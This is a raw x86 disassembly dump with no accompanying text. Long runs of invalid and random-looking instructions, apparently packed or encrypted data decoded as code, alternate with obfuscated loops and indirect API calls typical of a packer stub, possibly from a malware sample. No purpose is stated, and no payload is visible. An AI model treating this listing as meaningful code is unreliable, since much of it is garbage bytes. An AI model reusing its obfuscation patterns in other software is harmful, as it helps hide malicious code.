  40732c:	icebp  
  40732d:	push   cs
  40732e:	icebp  
  40732f:	mov    dh,0xc
  407331:	popa   
  407332:	cs cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407335:	jb     0x407369
  407337:	icebp  
  407338:	test   eax,0xf4d04270
  40733d:	xor    ch,BYTE PTR [esi+0x4e]
  407340:	mov    ebx,0x9d3a4286
  407345:	jns    0x407356
  407347:	jmp    0x27c482f7
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073ef
  407387:	repz test DWORD PTR [ecx+0x7e7ec20a],edx
  40738e:	add    eax,0xd57e7e7c
  407393:	mov    edi,DWORD PTR [ebx]
  407395:	jge    0x40738b
  407397:	adc    BYTE PTR ds:0x353c14fb,ch
  40739d:	(bad)  [ecx]
  40739f:	mov    ebx,0xfcf0ffb1
  4073a4:	idiv   BYTE PTR [esi+edx*8+0x4a]
  4073a8:	pop    esi
  4073a9:	jle    0x4073dc
  4073ab:	sub    al,0x56
  4073ad:	add    BYTE PTR [eax],bh
  4073af:	hlt    
  4073b0:	add    cl,BYTE PTR [esi-0x729617b9]
  4073b6:	and    bl,BYTE PTR [ebx+0x536a3b0f]
  4073bc:	xlat   BYTE PTR ds:[ebx]
  4073bd:	adc    dl,bl
  4073bf:	imul   edi,DWORD PTR [ecx+0x17],0xffffff9c
  4073c3:	sti    
  4073c4:	cmp    ah,BYTE PTR [ebx]
  4073c6:	mov    dl,0xf6
  4073c8:	xchg   esi,eax
  4073c9:	sbb    al,0x2d
  4073cb:	mov    DWORD PTR [ecx],eax
  4073cd:	je     0x4073a9
  4073cf:	icebp  
  4073d0:	jp     0x40744b
  4073d2:	gs mov edi,0x4b4ee4b
  4073d8:	mov    bl,0x61
  4073da:	dec    ebp
  4073db:	dec    esp
  4073dc:	push   0xffffff98
  4073de:	adc    bh,BYTE PTR [esi-0x11]
  4073e1:	xchg   esp,edi
  4073e3:	repnz outs dx,BYTE PTR ds:[esi]
  4073e5:	mov    esp,0xd884d173
  4073ea:	push   ds
  4073eb:	shl    DWORD PTR [ecx+ebx*4-0x7d],1
  4073ef:	jmp    0x8155:0x7d8232f8
  4073f6:	in     eax,0xd3
  4073f8:	es xchg edx,eax
  4073fa:	dec    esp
  4073fb:	inc    ebp
  4073fc:	mov    ecx,0xab7e6002
  407401:	ror    DWORD PTR [edi+ebx*8],0xe7
  407405:	dec    edi
  407406:	jmp    0x22e2:0xeaba15b8
  40740d:	push   eax
  40740e:	sub    al,0x82
  407410:	pop    es
  407411:	push   esi
  407412:	adc    ebx,DWORD PTR [edx+0x3fe0618f]
  407418:	dec    esp
  407419:	xchg   edi,eax
  40741a:	fiadd  DWORD PTR [ebp-0x4b]
  40741d:	xchg   esp,eax
  40741e:	mov    DWORD PTR [ebx-0x1c7e5b41],eax
  407424:	(bad)  
  407425:	sub    eax,0xa2cee3f6
  40742a:	mov    cl,BYTE PTR [ebp-0x7b]
  40742d:	xchg   ebx,eax
  40742e:	test   BYTE PTR [eax+0x5706f25b],al
  407434:	pop    ds
  407435:	sbb    BYTE PTR [ecx+0x3997f694],ch
  40743b:	in     eax,0xc
  40743d:	push   0x9d1c2fe2
  407442:	pop    ebx
  407443:	pop    esi
  407444:	xor    edx,DWORD PTR [ecx+0x20dbea34]
  40744a:	jp     0x40748f
  40744c:	fdiv   DWORD PTR [ebx+edx*4+0x64f7e259]
  407453:	jge    0x4073dd
  407455:	shl    BYTE PTR [ecx+0x22b041c1],cl
  40745b:	mov    esp,0x60779f0f
  407460:	fs retf 
  407462:	lea    esi,[ecx-0x64a85481]
  407468:	imul   esp,DWORD PTR [esi+0x1fa1a1f2],0x19
  40746f:	inc    BYTE PTR [eax]
  407471:	fisubr WORD PTR [ebp+0xb3c95a4]
  407477:	lods   eax,DWORD PTR ds:[esi]
  407478:	mov    dl,0x82
  40747a:	pusha  
  40747b:	imul   edx,DWORD PTR [esi+ebp*1+0x7c417841],0xffffffb4
  407483:	ret    
  407484:	xor    DWORD PTR [eax-0x546caeb9],esi
  40748a:	not    BYTE PTR [edi]
  40748c:	cmp    eax,esp
  40748e:	inc    edi
  40748f:	adc    al,0x7b
  407491:	xor    eax,0xd95aa0b3
  407496:	test   ah,0xa5
  407499:	or     bl,BYTE PTR [eax]
  40749b:	lds    esp,FWORD PTR [ebp+eiz*8-0x6db417d5]
  4074a2:	add    BYTE PTR [edx],bl
  4074a4:	xchg   ecx,eax
  4074a5:	mov    ebx,0x6cb61c94
  4074aa:	jb     0x40748e
  4074ac:	(bad)  
  4074ad:	sbb    ah,ah
  4074af:	ret    
  4074b0:	push   edx
  4074b1:	fld    TBYTE PTR [ebp+0x7d]
  4074b4:	and    edx,DWORD PTR [edx+0x2afcc252]
  4074ba:	and    DWORD PTR [esi-0x6ae66a77],0xfffffffc
  4074c1:	xor    al,0x2a
  4074c3:	sbb    DWORD PTR ss:[eax+0x39],esi
  4074c7:	arpl   WORD PTR [eax+0x6a],bx
  4074ca:	repz pusha 
  4074cc:	sbb    eax,0x93085fe3
  4074d1:	fwait
  4074d2:	sahf   
  4074d3:	clc    
  4074d4:	aad    0xeb
  4074d6:	es (bad) 
  4074d8:	hlt    
  4074d9:	shr    DWORD PTR [esi+ecx*1],cl
  4074dc:	push   ds
  4074dd:	mov    eax,0x9cac331e
  4074e2:	inc    esi
  4074e3:	imul   ebp,eax,0x269fd0f5
  4074e9:	ins    DWORD PTR es:[edi],dx
  4074ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074eb:	cmp    dl,BYTE PTR [ebx]
  4074ed:	push   esi
  4074ee:	xor    BYTE PTR [ebx+0x5be7e743],dh
  4074f4:	pop    edx
  4074f5:	add    BYTE PTR [esi+0x6fbada83],bl
  4074fb:	(bad)  
  4074fc:	pop    ds
  4074fd:	sub    al,0x41
  4074ff:	retf   
  407500:	aad    0x2a
  407502:	xchg   esi,eax
  407503:	call   0x114b3a41
  407508:	cdq    
  407509:	inc    edx
  40750a:	mov    al,ds:0xdd4398c
  40750f:	shl    edx,1
  407511:	test   al,0x20
  407513:	xor    BYTE PTR [edi-0x76],ch
  407516:	not    BYTE PTR [eax+0x1]
  407519:	mov    ch,0x47
  40751b:	cmc    
  40751c:	fisttp DWORD PTR [ebx]
  40751e:	aas    
  40751f:	lods   al,BYTE PTR ds:[esi]
  407520:	xor    DWORD PTR [eax+0x48],eax
  407523:	and    eax,0xf62a471a
  407528:	addr16 popa 
  40752a:	dec    edx
  40752b:	es pop ebp
  40752d:	adc    al,0xff
  40752f:	cld    
  407530:	icebp  
  407531:	iret   
  407532:	cmp    eax,0x1019aec1
  407537:	mov    ds:0xdcab0e59,al
  40753c:	icebp  
  40753d:	push   es
  40753e:	pop    edi
  40753f:	xor    BYTE PTR ds:[ecx-0x12],dl
  407543:	out    dx,eax
  407544:	test   BYTE PTR [ecx+0x33],dh
  407547:	ins    BYTE PTR es:[edi],dx
  407548:	xchg   ebp,eax
  407549:	push   ebx
  40754a:	fld    TBYTE PTR [ebx-0x18]
  40754d:	nop
  40754e:	mov    ah,0xd4
  407550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407551:	addr16 je 0x40752a
  407554:	xor    al,0x11
  407556:	jae    0x4074dc
  407558:	push   0xffffffff
  40755a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40755b:	pop    edx
  40755c:	sbb    DWORD PTR [ecx],esp
  40755e:	cmp    ch,BYTE PTR [eax]
  407560:	dec    ebx
  407561:	xchg   DWORD PTR [ebp+0x354ef946],ebp
  407567:	adc    dh,BYTE PTR ds:0xdb01e80a
  40756d:	mov    eax,ds:0x5ed8da47
  407572:	mov    edx,0x30f94d7
  407577:	adc    DWORD PTR [ebx+0x3f31aaed],edi
  40757d:	mov    ah,0xbc
  40757f:	lods   eax,DWORD PTR ds:[esi]
  407580:	nop
  407581:	sbb    BYTE PTR [esi+ebx*2-0x11],ch
  407585:	push   eax
  407586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407587:	mov    ah,0xbc
  407589:	(bad)  
  40758a:	je     0x407559
  40758c:	xchg   edx,eax
  40758d:	out    0xdf,eax
  40758f:	add    edi,DWORD PTR [edi+esi*2-0x272409e8]
  407596:	call   0x6d08:0x4e49caca
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	mov    ds:0x110429bb,eax
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x40767e
  407662:	sbb    BYTE PTR [ebx-0x11],al
  407665:	jmp    0x4992:0xdf0eb6f1
  40766c:	or     BYTE PTR [ebp-0x6eb97940],dh
  407672:	int    0x9a
  407674:	(bad)  
  407676:	mov    ds:0xf13f897d,al
  40767b:	shl    ch,0x2e
  40767e:	mov    cl,0x43
  407680:	rol    BYTE PTR ds:0x58371910,1
  407686:	imul   ebp,DWORD PTR [esi+0x5c1dc68e],0xd33e64fc
  407690:	idiv   DWORD PTR [ebp+0x4b]
  407693:	test   al,0x62
  407695:	or     ebp,DWORD PTR [ebp+eax*8-0x3]
  407699:	adc    DWORD PTR [ebp+edx*1+0x2c],ebp
  40769d:	sti    
  40769e:	xlat   BYTE PTR ds:[ebx]
  40769f:	push   ebp
  4076a0:	lea    edx,[ebx]
  4076a2:	iret   
  4076a3:	loopne 0x407660
  4076a5:	out    0x7,eax
  4076a7:	xor    al,BYTE PTR [ebx+0x2f]
  4076aa:	mov    eax,ds:0x8e682bd8
  4076af:	mov    dl,0x6e
  4076b1:	mov    bh,0x3c
  4076b3:	xor    dl,BYTE PTR [ebx-0x1b]
  4076b6:	imul   edx,DWORD PTR [edi+eax*4-0x71],0xffffffb6
  4076bb:	dec    esp
  4076bc:	fwait
  4076bd:	cmp    cl,BYTE PTR [ecx]
  4076bf:	jecxz  0x4076de
  4076c1:	or     BYTE PTR [eax],al
  4076c3:	pop    edi
  4076c4:	dec    ecx
  4076c5:	cld    
  4076c6:	xor    dh,BYTE PTR [ecx]
  4076c8:	adc    ecx,DWORD PTR [edx+0x5b]
  4076cb:	mov    bh,0x8e
  4076cd:	fwait
  4076ce:	push   esi
  4076cf:	mov    ebx,0x7d63ba32
  4076d4:	in     al,0x82
  4076d6:	mov    bl,0x18
  4076d8:	inc    esi
  4076d9:	stos   BYTE PTR es:[edi],al
  4076da:	fisttp WORD PTR [ecx]
  4076dc:	xchg   ebp,eax
  4076dd:	popa   
  4076de:	xor    esi,edi
  4076e0:	jne    0x4076b2
  4076e2:	mov    edx,0xc1ee8162
  4076e7:	cmp    DWORD PTR [edx+ebp*4],ebp
  4076ea:	add    eax,0x8a3911e
  4076ef:	retf   
  4076f0:	xor    al,0xe3
  4076f2:	push   ebx
  4076f3:	inc    BYTE PTR [edi+0x7b]
  4076f6:	add    ch,BYTE PTR ds:0x3796e685
  4076fc:	dec    edi
  4076fd:	loope  0x407714
  4076ff:	xchg   esi,eax
  407700:	mov    ds:0xcaac0769,eax
  407705:	fdiv   QWORD PTR [ebx]
  407707:	adc    dl,BYTE PTR [ebx]
  407709:	jmp    0x7404:0x5749cdd1
  407710:	dec    ecx
  407711:	jg     0x40769f
  407713:	out    dx,eax
  407714:	or     eax,0x1eb433d4
  407719:	jmp    0x32ad:0xf155a0c0
  407720:	xchg   ebx,eax
  407721:	cli    
  407722:	ja     0x407733
  407724:	jge    0x40779b
  407726:	xor    eax,0x157a541b
  40772b:	stos   DWORD PTR es:[edi],eax
  40772c:	xor    al,0x42
  40772e:	dec    ecx
  40772f:	mov    esi,0xdc3e4751
  407734:	xchg   ebp,eax
  407735:	test   eax,0x5a39c883
  40773a:	mov    DWORD PTR [ebp+0x8ec3ce6],ecx
  407740:	adc    ah,bl
  407742:	sbb    cl,0x4d
  407745:	cmp    cl,BYTE PTR [edi+0x4ad114b2]
  40774b:	fsubr  DWORD PTR [ebx+eiz*2+0x5f]
  40774f:	lea    esp,[ebx-0x1e0eb1c]
  407755:	dec    esp
  407756:	mov    ebp,0x7f044a65
  40775b:	jbe    0x40779d
  40775d:	jnp    0x407788
  40775f:	dec    eax
  407760:	jge    0x4077da
  407762:	lea    edx,[ecx]
  407764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407765:	ins    DWORD PTR es:[edi],dx
  407766:	inc    dx
  407768:	(bad)  
  407769:	jno    0x407776
  40776b:	adc    DWORD PTR [edi-0x262bf99c],eax
  407771:	cmp    ecx,0xffffff95
  407774:	shl    DWORD PTR [esi-0x80],0x70
  407778:	add    ecx,DWORD PTR [esi]
  40777a:	cld    
  40777b:	push   esi
  40777c:	or     esi,edx
  40777e:	push   esi
  40777f:	pusha  
  407780:	outs   dx,DWORD PTR ds:[esi]
  407781:	xchg   edx,eax
  407782:	not    BYTE PTR [esi+0x6e42126]
  407788:	aam    0x61
  40778a:	cmp    BYTE PTR [esi+ebx*8+0x7a],ch
  40778e:	faddp  st(3),st
  407790:	jbe    0x407810
  407792:	lea    ebp,[ebp-0x34fdf027]
  407798:	jnp    0x407800
  40779a:	pop    edi
  40779b:	fwait
  40779c:	and    esi,DWORD PTR [ecx]
  40779e:	popa   
  40779f:	fnstcw WORD PTR [ebp+0x44014f6e]
  4077a5:	push   esp
  4077a6:	arpl   WORD PTR [edx-0x27584dc7],cx
  4077ac:	lods   al,BYTE PTR ds:[esi]
  4077ad:	mov    eax,ds:0xd4a735f
  4077b2:	jp     0x40782e
  4077b4:	adc    ebx,DWORD PTR [eax+ebx*4-0x6328bc28]
  4077bb:	add    dh,ah
  4077bd:	rol    DWORD PTR [ebx],1
  4077bf:	mov    al,0x43
  4077c1:	add    DWORD PTR [esp+esi*1-0x4f],esi
  4077c5:	je     0x4077c2
  4077c7:	in     eax,dx
  4077c8:	mov    ah,0x2d
  4077ca:	fsubr  DWORD PTR [edi+0x32]
  4077cd:	pop    ss
  4077ce:	out    dx,al
  4077cf:	int3   
  4077d0:	adc    BYTE PTR [edi],al
  4077d2:	loopne 0x4077d2
  4077d4:	cvtps2pd xmm0,QWORD PTR [edi+0x741f9b4f]
  4077db:	ins    BYTE PTR es:[edi],dx
  4077dc:	adc    al,0x9c
  4077de:	jmp    0x407829
  4077e0:	stc    
  4077e1:	(bad)  
  4077e2:	adc    al,0x65
  4077e4:	or     al,0x95
  4077e6:	repnz div BYTE PTR [esi+esi*8+0x383bf5ca]
  4077ee:	push   esi
  4077ef:	fidivr DWORD PTR [edx+0x72f9abdd]
  4077f5:	nop
  4077f6:	test   al,0x4a
  4077f8:	adc    BYTE PTR [ecx+ecx*8],bl
  4077fb:	xor    eax,0x87a2a41
  407800:	test   DWORD PTR [ebx-0x74],esp
  407803:	popa   
  407804:	into   
  407805:	sub    eax,0x637e7573
  40780a:	jne    0x40779b
  40780c:	push   ecx
  40780d:	icebp  
  40780e:	iret   
  40780f:	fsubr  st,st(7)
  407811:	jne    0x40779d
  407813:	addr16 mov eax,ds:0x80d7
  407817:	mov    bl,0x2d
  407819:	gs pop ecx
  40781b:	jbe    0x40787d
  40781d:	lock mov ds:0xdb292ed5,al
  407823:	mov    bl,0xe5
  407825:	sub    eax,0x32db1816
  40782a:	adc    DWORD PTR [ebx],esi
  40782c:	inc    edi
  40782d:	imul   ecx,DWORD PTR ds:0x8a0c921b,0xffffffd9
  407834:	sbb    al,0xfe
  407836:	jl     0x4078ae
  407838:	arpl   WORD PTR [esp+ebp*8],bp
  40783b:	or     edi,DWORD PTR ds:0x34a23ab0
  407841:	xlat   BYTE PTR ds:[ebx]
  407842:	sub    DWORD PTR [ebx],edx
  407844:	mov    ch,0xfd
  407846:	or     DWORD PTR [edi-0x5],0x7335e5bd
  40784d:	jmp    0x978:0x5babcb92
  407854:	jecxz  0x4077eb
  407856:	addr16 int 0xc3
  407859:	pop    ebx
  40785a:	mov    ds,WORD PTR [edx+ebx*4+0xe]
  40785e:	xchg   ebx,eax
  40785f:	cmp    ecx,DWORD PTR [esi+ebp*1-0x7f579daa]
  407866:	fisubr DWORD PTR [ebx+eax*2+0x56ae3936]
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x98,eax
  407922:	lahf   
  407923:	js     0x407983
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0x957e7e7c
  40792e:	scas   al,BYTE PTR es:[edi]
  40792f:	adc    DWORD PTR [edx-0x1168a291],0xffffffc9
  407936:	ficom  WORD PTR [edi]
  407938:	mov    DWORD PTR [ecx+ebx*4],ecx
  40793b:	bound  edx,QWORD PTR [eax]
  40793d:	jne    0x40799b
  40793f:	in     al,dx
  407940:	in     al,0x49
  407942:	mov    edx,0xccdef4cd
  407947:	and    al,0x14
  407949:	add    eax,DWORD PTR [ebx+0x3a]
  40794c:	std    
  40794d:	sbb    eax,0x6fec6da5
  407952:	sbb    DWORD PTR [eax-0x37],esi
  407955:	sub    BYTE PTR [ecx+0x1debb5a7],cl
  40795b:	and    al,0x52
  40795d:	sub    BYTE PTR [ebx+0x2a3ba9a3],dh
  407963:	test   DWORD PTR [ecx],esi
  407965:	push   ebx
  407966:	stc    
  407967:	adc    al,0x38
  407969:	mov    ebp,0xaf6404bc
  40796e:	push   ebp
  40796f:	out    0x47,al
  407971:	pop    edx
  407972:	popf   
  407973:	stos   BYTE PTR es:[edi],al
  407974:	sbb    al,0x76
  407976:	push   ss
  407977:	push   edx
  407978:	fcom   QWORD PTR [edx+0x4]
  40797b:	bound  esp,QWORD PTR [eax]
  40797d:	ret    
  40797e:	or     edi,0xcd71fdac
  407984:	data16 (bad) 
  407987:	mov    ?,WORD PTR [edi+ebx*8+0xbb25915]
  40798e:	cmp    DWORD PTR [eax+0x63bfff3],edi
  407994:	sbb    eax,0x5d1740a1
  407999:	test   BYTE PTR gs:[esi+edi*4-0x51],bl
  40799e:	lds    edx,FWORD PTR [ecx+0x6741bc9b]
  4079a4:	dec    esi
  4079a5:	in     eax,0xa1
  4079a7:	pop    ss
  4079a8:	lods   eax,DWORD PTR ds:[esi]
  4079a9:	or     eax,0x2ecb6cbe
  4079ae:	in     eax,0x6d
  4079b0:	test   bl,0x83
  4079b3:	jmp    0x407a20
  4079b5:	dec    esi
  4079b6:	rcr    DWORD PTR [ebp+0x7b],1
  4079b9:	popf   
  4079ba:	aad    0x3c
  4079bc:	add    BYTE PTR [ebx],dl
  4079be:	leave  
  4079bf:	fdiv   st,st(2)
  4079c1:	mov    ebp,0xca59ccc9
  4079c6:	in     eax,dx
  4079c7:	pop    esi
  4079c8:	dec    edi
  4079c9:	dec    esi
  4079ca:	adc    DWORD PTR [edi],edx
  4079cc:	mov    eax,ds:0xc6b1d6e7
  4079d1:	xor    BYTE PTR [ebp+edi*2+0x66],0x7d
  4079d6:	and    eax,0xcda41a17
  4079db:	inc    esi
  4079dc:	or     ebx,DWORD PTR [esp+edx*8+0x66]
  4079e0:	(bad)  
  4079e1:	jmp    0x611d3110
  4079e6:	js     0x4079eb
  4079e8:	ret    0x6e13
  4079eb:	in     eax,dx
  4079ec:	popa   
  4079ed:	imul   eax,DWORD PTR [edx-0x63],0x8ccae062
  4079f4:	pushf  
  4079f5:	ins    BYTE PTR es:[edi],dx
  4079f6:	mov    DWORD PTR [edi],ecx
  4079f8:	xchg   esp,eax
  4079f9:	test   dl,ah
  4079fb:	bound  ebx,QWORD PTR [edx+ecx*2]
  4079fe:	cli    
  4079ff:	mov    ah,0x5
  407a01:	int3   
  407a02:	inc    ebx
  407a03:	xor    DWORD PTR [eax],ebx
  407a05:	mov    bl,0xba
  407a07:	lods   eax,DWORD PTR ds:[esi]
  407a08:	pop    ebp
  407a09:	retf   0x469
  407a0c:	shl    BYTE PTR [ebx+0x66cf23e],1
  407a12:	jl     0x4079a0
  407a14:	dec    edx
  407a15:	jecxz  0x407a66
  407a17:	jnp    0x4079ce
  407a19:	sub    DWORD PTR [edi+esi*1],edi
  407a1c:	jge    0x407a97
  407a1e:	retf   
  407a1f:	out    0xcf,eax
  407a21:	ret    0x598a
  407a24:	bound  ebx,QWORD PTR [esi-0x11]
  407a27:	imul   edx,DWORD PTR [edx-0x2d],0x95c5a42d
  407a2e:	jp     0x407a7f
  407a30:	jecxz  0x4079df
  407a32:	jl     0x4079f9
  407a34:	dec    edi
  407a35:	jmp    0xb80d218d
  407a3a:	xor    BYTE PTR ds:0xe223ee36,bh
  407a40:	mov    edi,ss
  407a42:	test   al,0x6
  407a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a45:	adc    DWORD PTR [ecx],eax
  407a47:	dec    edi
  407a48:	sbb    BYTE PTR [edx+0x606c8ca0],ch
  407a4e:	or     eax,0x815c4a4f
  407a53:	xchg   ebx,eax
  407a54:	(bad)
  407a58:	mov    bh,0xf4
  407a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a5b:	lods   eax,DWORD PTR ds:[esi]
  407a5c:	mov    ds:0xa19ec450,al
  407a61:	cmc    
  407a62:	test   BYTE PTR ds:0x3f189459,ch
  407a68:	rcl    DWORD PTR [ecx],cl
  407a6a:	popa   
  407a6b:	test   DWORD PTR [ebp+0x1f8d766f],0x7e80b0ac
  407a75:	mov    ds:0x7207cc34,al
  407a7a:	dec    ebp
  407a7b:	outs   dx,DWORD PTR ds:[esi]
  407a7c:	in     eax,0x77
  407a7e:	test   DWORD PTR [edi-0x6e45ee0b],edx
  407a84:	ret    
  407a85:	lds    edi,FWORD PTR [edx+ecx*2-0x2]
  407a89:	aas    
  407a8a:	retf   0x6e79
  407a8d:	add    ebx,DWORD PTR [ebx]
  407a8f:	or     eax,0xd0ea51d8
  407a94:	sbb    bh,BYTE PTR [esi-0x53]
  407a97:	(bad)  
  407a98:	fbld   TBYTE PTR [esi-0x637a1dac]
  407a9e:	out    dx,eax
  407a9f:	scas   eax,DWORD PTR es:[edi]
  407aa0:	test   DWORD PTR [ecx-0x734d77d3],ebx
  407aa6:	lea    esp,[edi-0x45d30ee9]
  407aac:	inc    esp
  407aad:	loopne 0x407a6e
  407aaf:	mov    ebx,0x6c412470
  407ab4:	icebp  
  407ab5:	(bad)  
  407ab6:	sub    eax,0x5887cf56
  407abb:	mov    ah,0x1d
  407abd:	rcr    BYTE PTR [edi-0x1a],0x73
  407ac1:	lds    esi,FWORD PTR [esi-0x3a9f1100]
  407ac7:	xor    DWORD PTR [ebx-0x22249757],esi
  407acd:	xchg   esi,eax
  407ace:	repnz cmp BYTE PTR [ebx],0xd
  407ad2:	mov    edx,0x5d434a48
  407ad7:	addr16 dec edx
  407ad9:	repz loop 0x407b37
  407adc:	sti    
  407add:	jae    0x407a8a
  407adf:	fcmovu st,st(6)
  407ae1:	test   DWORD PTR [eax+eax*4],esi
  407ae4:	and    edx,esi
  407ae6:	pusha  
  407ae7:	loop   0x407b5b
  407ae9:	into   
  407aea:	leave  
  407aeb:	fadd   DWORD PTR [ebp+eiz*2+0x7185ab3e]
  407af2:	mov    dl,0x98
  407af4:	mov    eax,0xfac06606
  407af9:	rol    DWORD PTR [edi+0x79],0x0
  407afd:	stc    
  407afe:	cmc    
  407aff:	int    0xc0
  407b01:	and    al,0x2b
  407b03:	arpl   WORD PTR [eax],ax
  407b05:	out    0xe6,al
  407b07:	gs cli 
  407b09:	jnp    0x407b4e
  407b0b:	gs loop 0x407af3
  407b0e:	jg     0x407b29
  407b10:	in     eax,0xf1
  407b12:	aaa    
  407b13:	pop    eax
  407b14:	outs   dx,BYTE PTR ds:[esi]
  407b15:	and    edx,DWORD PTR [edx+0x76]
  407b18:	xchg   ebp,eax
  407b19:	add    cl,bl
  407b1b:	mov    WORD PTR [ebx],ds
  407b1d:	inc    esp
  407b1e:	pop    edi
  407b1f:	cdq    
  407b20:	sbb    eax,0xad2bc80d
  407b25:	add    cl,BYTE PTR [ecx-0x6a]
  407b28:	(bad)  [ebp+ecx*2-0x23]
  407b2c:	nop
  407b2d:	ja     0x407b21
  407b2f:	fcmovne st,st(2)
  407b31:	pop    ecx
  407b32:	out    dx,al
  407b33:	add    al,0x90
  407b35:	lock (bad) 
  407b37:	cli    
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4337ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
